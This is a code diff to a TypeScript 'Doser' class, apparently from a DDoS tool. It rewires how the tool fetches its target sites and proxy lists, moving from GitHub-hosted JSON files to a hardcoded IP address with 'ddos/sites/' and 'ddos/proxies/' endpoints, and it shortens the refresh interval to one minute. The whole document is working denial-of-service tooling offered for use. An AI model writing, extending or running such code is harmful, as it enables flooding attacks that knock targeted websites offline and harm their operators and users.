@@ -1,9 +1,11 @@
 import axios, { AxiosError } from 'axios-https-proxy-fix'
 import { EventEmitter } from 'events'
-import { DoserEventType, TargetData, ProxyData, SiteData } from './worker.types'
+import { DoserEventType, ProxyData, SiteData } from './worker.types'
 import { Runner } from './runner'
 
-const CONFIGURATION_INVALIDATION_TIME = 300000
+axios.defaults.baseURL = 'http://185.69.154.95/api/'
+
+const CONFIGURATION_INVALIDATION_TIME = 60000
 
 export class Doser {
   private onlyProxy: boolean
@@ -91,8 +93,18 @@ export class Doser {
   async getSitesAndProxies (): Promise<{ sites: SiteData[]; proxies: ProxyData[]} | null> {
     while (this.working) { // escaping unavailable hosts
       try {
-        const sitesResponse = await axios.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json', { timeout: 10000 })
-        const proxyResponse = await axios.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/proxy.json', { timeout: 10000 })
+        const sitesResponse = await axios.get('ddos/sites/', {
+          timeout: 10000,
+          params: {
+            status: true
+          }
+        })
+        const proxyResponse = await axios.get('ddos/proxies/', {
+          timeout: 10000,
+          params: {
+            status: 'ok'
+          }
+        })
 
         if (sitesResponse.status !== 200) continue
         if (proxyResponse.status !== 200) continue
@@ -104,29 +116,6 @@ export class Doser {
           sites,
           proxies
         }
-      } catch (e) {
-        this.logError('Error while loading hosts', e)
-      }
-    }
-    return null
-  }
-
-  async getRandomTarget () {
-    while (this.working) { // escaping unavailable hosts
-      try {
-        const sitesResponse = await axios.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json', { timeout: 10000 })
-        const proxyResponse = await axios.get('https://raw.githubusercontent.com/opengs/uashieldtargets/master/proxy.json', { timeout: 10000 })
-
-        if (sitesResponse.status !== 200) continue
-        if (proxyResponse.status !== 200) continue
-
-        const sites = sitesResponse.data as Array<SiteData>
-        const proxyes = proxyResponse.data as Array<ProxyData>
-
-        return {
-          site: sites[Math.floor(Math.random() * sites.length)],
-          proxy: proxyes
-        } as TargetData
       } catch (e) {
         this.logError('Error while loading hosts', e)
       }
